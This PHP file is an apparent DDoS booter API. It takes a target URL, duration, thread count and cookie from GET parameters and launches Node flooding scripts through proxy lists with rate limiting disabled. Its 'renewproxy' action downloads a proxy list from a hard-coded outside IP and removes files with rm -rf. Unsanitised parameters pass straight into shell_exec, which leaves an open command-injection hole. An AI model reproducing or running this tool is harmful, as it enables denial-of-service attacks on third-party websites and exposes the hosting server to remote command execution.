<?php
echo("<title>Layer 7 Cat Momentum Api</title>");
echo '<link rel="shortcut icon" href="fav.ico"/>';
error_reporting(0);
$target = $_GET['target'];
$time = $_GET['time'];
$key = $_GET['key'];
$method = htmlspecialchars($_GET['method']);
$data = htmlspecialchars($_GET['postdata']);
$httpversion = $_GET['httpversion'];
$cookie = $_GET['cookie'];
$concurent = $_GET['concurent'];



switch($method) {
    case 'raw': $output = shell_exec("screen -dmS $key node raw.js $target $time proxys.txt");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n"; 
    break;
    case 'HTTP-GET': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body null --ratelimit deactivate --cookie false");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n"; 
    break;
    case 'HTTP-DATA': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body $data --ratelimit deactivate --cookie false");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n"; 
    break;
    case 'HTTP-COOKIE': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body null --ratelimit deactivate --cookie $cookie");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n"; 
    break;
    case 'HTTP-POSTCOOKIE': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurent --method GET --body $data --ratelimit deactivate --cookie $cookie");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n";
    break;
    case 'bps': $output = shell_exec("screen -dmS $key node otters.js $target $time $concurent GET $httpversion referer.txt ua.txt proxys.txt");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n";
    break;
    case 'bypass': $output = shell_exec("screen -dmS $key node bypass.js $target $time $concurent bypass");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "CONCURENT: <strong>$concurent</strong>\n";
    break;
    case 'httpacid': $output = shell_exec("screen -dmS $key node browser.js $target $time 12 $httpversion 50000 64 proxys.txt");
        echo "<center><body><pre>";
        echo "URL: <strong>$target</strong>\n";
        echo "TIME: <strong>$time</strong>\n";
        echo "BROWSER: <strong>12</strong>\n";
   break;
   case 'stop': $output = shell_exec("pkill -f $key");
        echo "<center><body><pre>";
        echo "your attack as been stopped";
    break;
    case 'stopall': $output = shell_exec("pkill node -9");
        echo "<center><body><pre>";
        echo "all attack has been stopped";
    break;
    case 'renewproxy': $output = shell_exec("wget http://194.9.172.114/PROXYS/proxys2.txt; rm -rf proxys.txt; cat proxys2.txt > proxys.txt");
    echo "<center><body><pre>";
    echo "proxy renewed.";
    break;
}

return;
?>
